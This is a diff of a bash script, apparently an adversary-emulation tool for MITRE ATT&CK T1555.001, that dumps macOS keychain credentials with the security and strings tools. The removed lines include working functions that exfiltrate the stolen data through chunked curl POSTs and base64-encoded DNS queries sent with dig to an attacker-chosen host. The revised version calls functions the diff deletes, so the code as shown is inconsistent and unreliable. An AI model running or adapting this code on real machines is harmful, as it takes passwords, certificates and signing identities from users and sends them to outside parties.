@@ -1,4 +1,3 @@
-#!/bin/bash
 
 # Script Name: keychain.sh
 # MITRE ATT&CK Technique: T1555.001
@@ -7,16 +6,13 @@
 # Version: 1.0
 
 # Description:
-# Txtract credentials stored in macOS keychains with MacOS native tools. 
+# Extract credentials stored in macOS keychains with MacOS native tools. 
 
 # References:
 # - https://attack.mitre.org/techniques/T1555/001/
 # - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.001/T1555.001.md
-# - 
 
-
-
-# MITRE ATT&CK Mappings
+# MITRE ATT&CK Reference var map
 TACTIC="Credential Access"
 TTP_ID="T1555.001"
 
@@ -33,74 +29,83 @@ TTP_ID_ENCODE_BASE64="T1027.001"
 TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
 TTP_ID_ENCODE_PERL="T1059.006"
 
-
-
-# Global Variables
+# Script metadata 
 NAME="keychain"
+
+# Global Control Switches
+SUDO_MODE=false
 VERBOSE=false
+DEBUG=false
+ALL=false
+
+# Output Control Switches
 LOG_ENABLED=false
 ENCODE="none"
+ENCRYPT="none"
+OUTPUT_JSON=false
+
+# Exfiltration Control Switches
 EXFIL=false
 EXFIL_METHOD=""
 EXFIL_URI=""
-USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-ENCRYPT="none"
-ENCRYPT_KEY=""
-CHUNK_SIZE=1000  # Default chunk size
+
+# Security Check Switches
+CHECK_EDR=false
+CHECK_AV=false
+CHECK_FIREWALL=false
+CHECK_MRT=false
+CHECK_GATEKEEPER=false
+CHECK_XPROTECT=false
+CHECK_TCC=false
+CHECK_OST=false
+CHECK_HIDS=false
+
+# Logging Configuration
 LOG_DIR="../../logs"
-LOG_FILE="${LOG_DIR}/${TTP_ID}_${NAME}.log"
+LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
+LOG_FILE="${LOG_DIR}/${LOG_FILE_NAME}"
 
-# Command Input Variables
-ACCOUNT=""
-SERVICE=""
-SERVER=""
-OUTPUT_FILE=""
+# Input Variables with Defaults
+INPUT_ACCOUNT=""
+INPUT_SERVICE=""
+INPUT_SERVER=""
+INPUT_OUTPUT_FILE=""
+INPUT_CHUNK_SIZE=1000
+INPUT_TIMEOUT=10
+INPUT_RATE_LIMIT=0.5
+INPUT_FORMAT="raw"
 
-# Use an array for storing commands
-COMMANDS="
-dump_keychain:security dump-keychain login.keychain
-find_generic:security find-generic-password -a \"\$ACCOUNT\" -s \"\$SERVICE\"
-find_internet:security find-internet-password -a \"\$ACCOUNT\" -s \"\$SERVER\"
-find_cert:security find-certificate -a -p
-unlock_keychain:security unlock-keychain login.keychain
-export_items:security export -k login.keychain -t certs -f pem -o \"\$OUTPUT_FILE\"
-find_identity:security find-identity -v -p codesigning
-strings_keychain:strings ~/Library/Keychains/login.keychain-db
-"
+# Command Variables (use full paths for critical commands)
+CMD_SECURITY="/usr/bin/security"
+CMD_SQLITE3="/usr/bin/sqlite3"
+CMD_STRINGS="/usr/bin/strings"
+CMD_OPENSSL="/usr/bin/openssl"
+CMD_BASE64="/usr/bin/base64"
+CMD_XXD="/usr/bin/xxd"
+CMD_CURL="/usr/bin/curl"
+CMD_DIG="/usr/bin/dig"
 
+# Command Map
+declare -A COMMANDS=(
+    ["dump_keychain"]="$CMD_SECURITY dump-keychain login.keychain"
+    ["find_generic"]="$CMD_SECURITY find-generic-password -a \"\$INPUT_ACCOUNT\" -s \"\$INPUT_SERVICE\""
+    ["find_internet"]="$CMD_SECURITY find-internet-password -a \"\$INPUT_ACCOUNT\" -s \"\$INPUT_SERVER\""
+    ["find_cert"]="$CMD_SECURITY find-certificate -a -p"
+    ["unlock_keychain"]="$CMD_SECURITY unlock-keychain login.keychain"
+    ["export_items"]="$CMD_SECURITY export -k login.keychain -t certs -f pem -o \"\$INPUT_OUTPUT_FILE\""
+    ["find_identity"]="$CMD_SECURITY find-identity -v -p codesigning"
+    ["strings_keychain"]="$CMD_STRINGS ~/Library/Keychains/login.keychain-db"
+)
+
+# Utility Functions
 
 #FunctionType: utility
-display_help() {
-    echo "Usage: $0 [OPTIONS]"
-    echo ""
-    echo "Description:"
-    echo "  Attempts to dump macOS keychain items to extract credentials."
-    echo ""
-    echo "Options:"
-    echo "  General:"
-    echo "    --help                 Show this help message"
-    echo "    --verbose              Enable detailed output"
-    echo "    --log                  Log output to file (rotates at 5MB)"
-    echo ""
-    echo "  Output Processing:"
-    echo "    --encode=TYPE          Encode output (b64|hex) using base64 or xxd"
-    echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
-    echo ""
-    echo "  Data Exfiltration:"
-    echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
-    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig (RFC 1035)"
-    echo "    --chunksize=SIZE       Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)"
-    echo ""
-    echo "  Credential Access Commands:"
-    echo "    --dump-keychain        Attempt to dump keychain items"
-    echo "    --find-generic         Attempt to find a generic password in keychain"
-    echo "    --find-internet        Attempt to find an internet password in keychain"
-    echo "    --find-cert            Attempt to find certificates in keychain"
-    echo "    --unlock-keychain      Attempt to unlock keychain"
-    echo "    --export-items         Attempt to export items from keychain"
-    echo "    --find-identity        Attempt to find identity used for code signing"
-    echo "    --strings-keychain     Attempt to read keychain strings"
-    echo "    --sqlite-dump          Attempt to dump keychain using sqlite3"
+validate_sudo_mode() {
+    if [ "$SUDO_MODE" = true ] && [ "$(id -u)" != "0" ]; then
+        echo "Error: Root privileges required. Please run with sudo." >&2
+        return 1
+    fi
+    return 0
 }
 
 #FunctionType: utility
@@ -125,8 +130,11 @@ log_to_stdout() {
 
 #FunctionType: utility
 create_log() {
-    local script_name=$(basename "$0" .sh)
+    if [ ! -d "$LOG_DIR" ]; then
+        mkdir -p "$LOG_DIR"
+    fi
     touch "$LOG_FILE"
+    chmod 600 "$LOG_FILE"
 }
 
 #FunctionType: utility
@@ -148,334 +156,218 @@ log_output() {
 }
 
 #FunctionType: utility
-log_and_append() {
-    local result="$1"
-    
-    # Only log if logging is enabled
-    if [ "$LOG_ENABLED" = true ]; then
-        echo "$result" >> "$LOG_FILE"
-    fi
-}
-
-#FunctionType: utility
-validate_dns() {
-    local domain="$1"
-    if host "$domain" > /dev/null 2>&1; then
-        return 0
-    else
-        return 1
-    fi
-}
-
-#FunctionType: utility
-chunk_data() {
-    local data="$1"
-    local chunk_size="$2"
-    local output=""
-    
-    while [ -n "$data" ]; do
-        output+="${data:0:$chunk_size}"$'\n'
-        data="${data:$chunk_size}"
-    done
-    
-    echo "$output"
-}
-
-#FunctionType: utility
-encode_output() {
-    local data="$1"
-    local original_ttp_id=$TTP_ID
-    local original_tactic=$TACTIC
-
-    case $ENCODE in
-        b64)
-            TTP_ID=$TTP_ID_ENCODE_BASE64
-            TACTIC=$TACTIC_ENCODE
-            log_to_stdout "Encoded output using Base64" "encode_output" "base64"
-            echo "$output" | base64
-            ;;
-        hex)
-            TTP_ID=$TTP_ID_ENCODE
-            TACTIC=$TACTIC_ENCODE
-            log_to_stdout "Encoded output using Hex" "encode_output" "xxd -p"
-            echo "$output" | xxd -p
-            ;;
-        perl_b64)
-            TTP_ID=$TTP_ID_ENCODE_PERL
-            TACTIC="Execution"
-            log_to_stdout "Encoded output using Perl Base64" "encode_output" "perl -MMIME::Base64 -e 'print encode_base64(\"$output\");'"
-            perl -MMIME::Base64 -e "print encode_base64(\"$output\");"
-            ;;
-        perl_utf8)
-            TTP_ID=$TTP_ID_ENCODE_PERL
-            TACTIC="Execution"
-            log_to_stdout "Encoded output using Perl UTF-8" "encode_output" "perl -e 'print \"$output\".encode(\"UTF-8\");'"
-            perl -e "print \"$output\".encode(\"UTF-8\");"
-            ;;
-        *)
-            echo "Unknown encoding type: $ENCODE" >&2
-            return 1
-            ;;
-    esac
-
-    TTP_ID=$original_ttp_id
-    TACTIC=$original_tactic
-}
-
-#FunctionType: utility
-encrypt_output() {
-    local data="$1"
-    openssl enc -"$ENCRYPT" -base64 -k "$ENCRYPT_KEY" <<< "$data"
-}
-
-#FunctionType: utility
 validate_input() {
-    local command="$1"
-    shift
-    local args=("$@")
-
-    case "$command" in
-        find_generic|find_internet)
-            if [ -z "$ACCOUNT" ] || [ -z "$SERVICE" ]; then
-                echo "Error: ACCOUNT and SERVICE required for $command" >&2
+    local input="$1"
+    local input_type="$2"
+    
+    case "$input_type" in
+        "account")
+            if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
+                log_to_stdout "Invalid account name: $input" "validate_input" ""
                 return 1
             fi
             ;;
-        export_items)
-            if [ -z "$OUTPUT_FILE" ]; then
-                echo "Error: OUTPUT_FILE required for $command" >&2
+        "service")
+            if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
+                log_to_stdout "Invalid service name: $input" "validate_input" ""
                 return 1
             fi
             ;;
-        # Add more validations as needed
+        "server")
+            if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
+                log_to_stdout "Invalid server name: $input" "validate_input" ""
+                return 1
+            fi
+            ;;
+        "file")
+            if [[ ! "$input" =~ ^[a-zA-Z0-9._/-]+$ ]]; then
+                log_to_stdout "Invalid file path: $input" "validate_input" ""
+                return 1
+            fi
+            ;;
     esac
-
     return 0
 }
 
-
-#FunctionType: utility
-execute_command() {
-    local cmd_key="$1"
-    local cmd=$(echo "$COMMANDS" | awk -F: -v key="$cmd_key" '$1 == key {print $2}')
-    
-    if [ -z "$cmd" ]; then
-        echo "Unknown command: $cmd_key" >&2
-        return 1
-    fi
-    
-    eval "$cmd" 2>&1 || echo "Command failed: $cmd" >&2
+#FunctionType: credential_access
+dump_keychain() {
+    log_to_stdout "Attempting to dump keychain" "dump_keychain" "${COMMANDS[dump_keychain]}"
+    eval "${COMMANDS[dump_keychain]}"
 }
 
-#FunctionType: attackScript
-
-
-exfiltrate_http() {
-    local data="$1"
-    local url="$2"
-    local og_ttp="$TTP_ID"
-    TTP_ID="$TTP_ID_EXFIL"
-
-    log_to_stdout "Starting HTTP exfiltration" "exfiltrate_http" "curl $url"
-    
-    local chunks=$(chunk_data "$data" "$CHUNK_SIZE")
-    local total=$(echo "$chunks" | wc -l)
-    local count=1
-
-    echo "$chunks" | while IFS= read -r chunk; do
-        local size=${#chunk}
-        log_to_stdout "Sending chunk $count/$total ($size bytes)" "exfiltrate_http" "curl $url"
-        
-        if curl -L -s -X POST -d "$chunk" "$url" --insecure -o /dev/null -w "%{http_code}" | grep -q "^2"; then
-            log_to_stdout "Chunk $count/$total sent" "exfiltrate_http" "curl $url"
-        else
-            log_to_stdout "Chunk $count/$total failed" "exfiltrate_http" "curl $url"
-            TTP_ID="$og_ttp"
+#FunctionType: credential_access
+find_generic_password() {
+    if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVICE" ]; then
+        if ! validate_input "$INPUT_ACCOUNT" "account" || ! validate_input "$INPUT_SERVICE" "service"; then
             return 1
         fi
-        count=$((count + 1))
-    done
-
-    log_to_stdout "HTTP exfiltration complete" "exfiltrate_http" "curl $url"
-    TTP_ID="$og_ttp"
-    return 0
-}
-
-#FunctionType: attackScript
-exfiltrate_dns() {
-    local data="$1"
-    local domain="$2"
-    local id="$3"
-    local original_ttp_id=$TTP_ID
-    TTP_ID=$TTP_ID_EXFIL
-
-    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
-    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
-    local dns_chunk_size=63  # Fixed max length of a DNS label
-
-    log_to_stdout "Attempting to exfiltrate data via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
-
-    # Send the ID first
-    if ! dig +short "${encoded_id}.id.$domain" A > /dev/null; then
-        log_to_stdout "Failed to send ID via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
-        TTP_ID=$original_ttp_id
-        return 1
-    fi
-
-    local chunks=$(chunk_data "$encoded_data" "$dns_chunk_size")
-    local total_chunks=$(echo "$chunks" | wc -l)
-    local chunk_num=0
-
-    echo "$chunks" | while IFS= read -r chunk; do
-        if dig +short "${chunk}.${chunk_num}.$domain" A > /dev/null; then
-            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
-        else
-            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
-            TTP_ID=$original_ttp_id
-            return 1
-        fi
-        chunk_num=$((chunk_num+1))
-    done
-
-    if dig +short "end.$domain" A > /dev/null; then
-        log_to_stdout "Successfully completed DNS exfiltration" "exfiltrate_dns" "dig +short end.$domain"
-        TTP_ID=$original_ttp_id
-        return 0
+        log_to_stdout "Searching for generic password" "find_generic_password" "${COMMANDS[find_generic]}"
+        eval "${COMMANDS[find_generic]}"
     else
-        log_to_stdout "Failed to send end signal via DNS" "exfiltrate_dns" "dig +short end.$domain"
-        TTP_ID=$original_ttp_id
+        log_to_stdout "Account and service required for generic password search" "find_generic_password" ""
         return 1
     fi
 }
 
-#FunctionType: utility
-validate_permissions() {
-    if [ "$EUID" -ne 0 ]; then
-        echo "Error: Root permissions are required to execute this action. Please run as root or use sudo."
+#FunctionType: credential_access
+find_internet_password() {
+    if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVER" ]; then
+        if ! validate_input "$INPUT_ACCOUNT" "account" || ! validate_input "$INPUT_SERVER" "server"; then
+            return 1
+        fi
+        log_to_stdout "Searching for internet password" "find_internet_password" "${COMMANDS[find_internet]}"
+        eval "${COMMANDS[find_internet]}"
+    else
+        log_to_stdout "Account and server required for internet password search" "find_internet_password" ""
+        return 1
+    fi
+}
+
+#FunctionType: credential_access
+find_certificates() {
+    log_to_stdout "Searching for certificates" "find_certificates" "${COMMANDS[find_cert]}"
+    eval "${COMMANDS[find_cert]}"
+}
+
+#FunctionType: credential_access
+unlock_keychain() {
+    log_to_stdout "Attempting to unlock keychain" "unlock_keychain" "${COMMANDS[unlock_keychain]}"
+    eval "${COMMANDS[unlock_keychain]}"
+}
+
+#FunctionType: credential_access
+export_items() {
+    if [ -n "$INPUT_OUTPUT_FILE" ]; then
+        if ! validate_input "$INPUT_OUTPUT_FILE" "file"; then
+            return 1
+        fi
+        log_to_stdout "Exporting keychain items" "export_items" "${COMMANDS[export_items]}"
+        eval "${COMMANDS[export_items]}"
+    else
+        log_to_stdout "Output file required for export" "export_items" ""
+        return 1
+    fi
+}
+
+#FunctionType: credential_access
+find_identity() {
+    log_to_stdout "Searching for code signing identities" "find_identity" "${COMMANDS[find_identity]}"
+    eval "${COMMANDS[find_identity]}"
+}
+
+#FunctionType: credential_access
+strings_keychain() {
+    log_to_stdout "Extracting strings from keychain" "strings_keychain" "${COMMANDS[strings_keychain]}"
+    eval "${COMMANDS[strings_keychain]}"
+}
+
+# Main function
+main() {
+    # Validate sudo mode first if required
+    if ! validate_sudo_mode; then
         exit 1
     fi
-}
 
-#FunctionType: attackScript
-execute_ttp() {
-    local input_cmd_arg="$1"
-    local output=""
-
-    if ! validate_input "$input_cmd_arg"; then
-        return 1
+    # Initialize logging if enabled
+    if [ "$LOG_ENABLED" = true ]; then
+        create_log
     fi
 
-    case "$input_cmd_arg" in
-        "dump-keychain"|"find-generic"|"find-internet"|"find-cert"|"unlock-keychain"|"export-items"|"find-identity"|"strings-keychain"|"sqlite-dump")
-            log_to_stdout "Attempting to $input_cmd_arg" "execute_ttp" "${COMMANDS[${input_cmd_arg//-/_}]}"
-            output+=$(execute_command "${input_cmd_arg//-/_}")
-            ;;
-        *)
-            output+="Unknown action type: $input_cmd_arg\n"
-            ;;
-    esac
+    local output=""
+    local processed_output=""
 
-    echo "$output"
+    # Execute credential access functions based on switches
+    if [ "$ALL" = true ]; then
+        output+="$(dump_keychain)\n"
+        output+="$(find_certificates)\n"
+        output+="$(find_identity)\n"
+        output+="$(strings_keychain)\n"
+    else
+        if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVICE" ]; then
+            output+="$(find_generic_password)\n"
+        fi
+        if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVER" ]; then
+            output+="$(find_internet_password)\n"
+        fi
+        if [ -n "$INPUT_OUTPUT_FILE" ]; then
+            output+="$(export_items)\n"
+        fi
+    fi
+
+    # Process output
+    if [ "$ENCODE" != "none" ]; then
+        processed_output=$(encode_output "$output")
+    fi
+
+    if [ "$ENCRYPT" != "none" ]; then
+        processed_output=$(encrypt_output "${processed_output:-$output}")
+    fi
+
+    # Handle output based on settings
+    if [ "$LOG_ENABLED" = true ]; then
+        log_output "${processed_output:-$output}"
+    fi
+
+    if [ "$EXFIL" = true ]; then
+        if [ "$EXFIL_METHOD" = "dns" ]; then
+            exfiltrate_dns "${processed_output:-$output}" "$EXFIL_URI"
+        else
+            exfiltrate_http "${processed_output:-$output}" "$EXFIL_URI"
+        fi
+    else
+        echo "${processed_output:-$output}"
+    fi
 }
 
-# Parse command-line arguments
+# Parse command line arguments
 while [ "$#" -gt 0 ]; do
     case "$1" in
-        --help) display_help; exit 0 ;;
-        --verbose) VERBOSE=true ;;
-        --log) LOG_ENABLED=true ;;
-        --dump-keychain|--find-generic|--find-internet|--find-cert|--unlock-keychain|--export-items|--find-identity|--strings-keychain|--sqlite-dump)
-            if validate_input "${1#--}"; then
-                execute_ttp "${1#--}"
-            else
-                exit 1
-            fi
+        -h|--help) display_help; exit 0 ;;
+        -v|--verbose) VERBOSE=true ;;
+        -d|--debug) DEBUG=true ;;
+        -l|--log) LOG_ENABLED=true ;;
+        -a|--all) ALL=true ;;
+        --sudo) SUDO_MODE=true ;;
+        -j|--json) OUTPUT_JSON=true ;;
+        -e|--encode)
+            shift
+            ENCODE="$1"
             ;;
-        --account=*) ACCOUNT="${1#*=}" ;;
-        --service=*) SERVICE="${1#*=}" ;;
-        --output-file=*) OUTPUT_FILE="${1#*=}" ;;
-        --encode=*)
-            ENCODE="${1#*=}"
-            if ! validate_input "$ENCODE" "^(b64|hex|perl_b64|perl_utf8)$"; then
-                echo "Invalid encoding type: $ENCODE" >&2
-                exit 1
-            fi
-            ;;
-        --encrypt=*)
-            ENCRYPT="${1#*=}"
-            if ! validate_input "$ENCRYPT" "^[a-zA-Z0-9_-]+$"; then
-                echo "Invalid encryption method: $ENCRYPT" >&2
-                exit 1
-            fi
-            ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/')
+        -E|--encrypt)
+            shift
+            ENCRYPT="$1"
+            ENCRYPT_KEY=$($CMD_OPENSSL rand -base64 32)
             ;;
         --exfil=*)
             EXFIL=true
-            EXFIL_METHOD="${1#*=}"
-            EXFIL_URI="${1#*=dns=}"
-            if ! validate_input "$EXFIL_METHOD" "^(http://|https://|dns=)[a-zA-Z0-9.-]+"; then
-                echo "Invalid exfiltration method: $EXFIL_METHOD" >&2
-                exit 1
+            EXFIL_URI="${1#*=}"
+            if [[ "$EXFIL_URI" == dns=* ]]; then
+                EXFIL_METHOD="dns"
+                EXFIL_URI="${EXFIL_URI#dns=}"
+            else
+                EXFIL_METHOD="http"
             fi
             ;;
-        --chunksize=*)
-            CHUNK_SIZE="${1#*=}"
-            if ! validate_input "$CHUNK_SIZE" "^[0-9]+$"; then
-                echo "Invalid chunk size: $CHUNK_SIZE" >&2
-                exit 1
-            fi
+        -c|--chunksize)
+            shift
+            INPUT_CHUNK_SIZE="$1"
+            ;;
+        --account=*)
+            INPUT_ACCOUNT="${1#*=}"
+            ;;
+        --service=*)
+            INPUT_SERVICE="${1#*=}"
+            ;;
+        --server=*)
+            INPUT_SERVER="${1#*=}"
+            ;;
+        --output=*)
+            INPUT_OUTPUT_FILE="${1#*=}"
             ;;
         *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
     esac
     shift
 done
 
-main() {
-    local output=""
-    local separator=$'\n---\n'
-
-    if [ $# -eq 0 ]; then
-        display_help
-        exit 0
-    fi
-
-    # Process each argument
-    for arg in "$@"; do
-        case "$arg" in
-            --dump-keychain|--find-generic|--find-internet|--find-cert|--unlock-keychain|--export-items|--find-identity|--strings-keychain|--sqlite-dump)
-                output+="${separator}Executing TTP (${arg#--}):${separator}"
-                output+=$(execute_ttp "${arg#--}")
-                ;;
-        esac
-    done
-
-    if [ -n "$output" ]; then
-        if [ "$ENCODE" != "none" ]; then
-            encoded_output=$(encode_output "$output")
-        fi
-
-        if [ "$ENCRYPT" != "none" ]; then
-            encrypted_output=$(encrypt_output "${encoded_output:-$output}")
-        fi
-
-        if [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ]; then
-            log_output "${encrypted_output:-${encoded_output:-$output}}"
-        elif [ "$LOG_ENABLED" != true ]; then
-            echo "${encrypted_output:-${encoded_output:-$output}}"
-        fi
-
-        if [ "$EXFIL" = true ]; then
-            local data_to_exfil="${encrypted_output:-${encoded_output:-$output}}"
-            if [[ "$EXFIL_METHOD" == http://* ]]; then
-                exfiltrate_http "$data_to_exfil" "$EXFIL_METHOD"
-            elif [[ "$EXFIL_METHOD" == dns=* ]]; then
-                local domain="${EXFIL_METHOD#dns=}"
-                exfiltrate_dns "$data_to_exfil" "$domain" "$(date +%s)"
-            fi
-        fi
-    else
-        echo "No information found"
-    fi
-}
-
+# Execute main function
 main
